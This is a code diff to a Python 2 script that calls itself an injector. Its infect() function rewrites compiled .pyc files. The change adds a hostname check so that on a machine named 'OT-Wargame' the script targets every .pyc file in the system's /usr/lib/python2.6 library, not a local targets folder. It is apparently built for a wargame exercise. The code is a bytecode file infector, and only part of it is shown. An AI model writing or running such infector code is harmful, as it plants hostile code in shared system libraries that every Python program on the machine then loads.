@@ -2,6 +2,7 @@ import glob
 import zlib
 import base64
 import marshal
+import socket
 
 
 Code = None
@@ -30,7 +31,12 @@ def infect(f_to_infect):
     newfile.close()
 
 
-for i in glob.glob("./targets/*.pyc"):
+if socket.gethostname() == "OT-Wargame":
+    target_dir = "/usr/lib/python2.6/*.pyc"
+else:
+    target_dir = "./targets/*.pyc"
+
+for i in glob.glob(target_dir):
     infect(i)
 
 print "Fin injector"
